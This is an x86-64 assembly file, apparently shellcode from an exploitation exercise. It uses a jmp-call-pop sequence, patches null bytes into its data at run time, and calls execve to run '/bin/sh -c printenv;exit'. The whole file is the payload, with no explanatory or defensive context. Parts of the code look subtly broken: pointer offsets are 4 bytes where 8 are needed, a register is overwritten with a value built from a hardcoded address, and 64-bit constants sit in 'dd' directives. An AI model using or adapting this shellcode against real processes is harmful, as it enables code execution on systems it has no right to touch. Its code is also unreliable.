          bits 64
            ; find out where we are
start:     jmp short codeEnd
start2:    pop rsi
            ; clear the a register
           mov rax,0x0
            ; restore null bytes to data
           mov [byte rsi+flagStr-exeStr-2],al
           mov [byte rsi+cmdStr-exeStr-1],al
           mov [byte rsi+arrayAddr-exeStr-1],al
           mov [byte rsi+arrayAddr-exeStr+24],rax
           
            ; restore argv
            
           mov [byte rsi + arrayAddr - exeStr],rsi
           lea rdi,[byte rsi + flagStr - exeStr] 
           mov [byte rsi + arrayAddr - exeStr + 4],rdi
           lea rdi, [byte rsi + cmdStr - exeStr]
           mov [byte rsi + arrayAddr - exeStr + 8],rdi

            ; execve system call
           mov al,0x3b
           mov rdi,exeStr
           mov rsi,arrayAddr
           mov rdx,rsp
           shr rdx,32
           shl rdx,32
           mov rcx,[0x7ffff7fb56c0]
           or  rdx,rcx
           lea rdi,[rdx]
           syscall

            ; exit system call
           mov rdi,rax
           xor rax,rax
           mov al,0x3c
           syscall

codeEnd:   call start2
            ; data
exeStr:    db "/bin/shXy"
flagStr:   db "-cX"
cmdStr:    db "printenv;exitX"
arrayAddr: dd 0xffffffffffffffff
           dd 0xffffffffffffffff
           dd 0xffffffffffffffff
           dd 0xffffffffffffffff
newAddr: dd newAddr-start
